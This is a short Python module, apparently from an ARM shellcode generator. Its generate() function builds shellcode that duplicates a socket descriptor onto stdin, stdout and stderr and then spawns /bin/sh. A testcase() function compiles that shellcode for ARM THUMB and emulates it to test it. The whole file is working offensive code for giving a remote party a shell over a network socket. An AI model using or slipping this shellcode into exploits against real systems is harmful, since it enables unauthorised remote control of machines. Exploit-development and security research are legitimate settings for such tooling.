import dup
import sh

def generate(sock=4, cmd='/bin/sh'):
    """Duplicates sock to stdin, stdout and stderr and spawns a shell

    Args:
        sock(int/str/reg): sock descriptor

        cmd(str): executes a cmd (default: /bin/sh)

    """
    sc = dup.generate(sock)
    sc += sh.generate(cmd)
    return sc

def testcase(sock=4, cmd='/bin/sh'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(sock, cmd), isThumb=True)
    sclen = sc.find(cmd)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
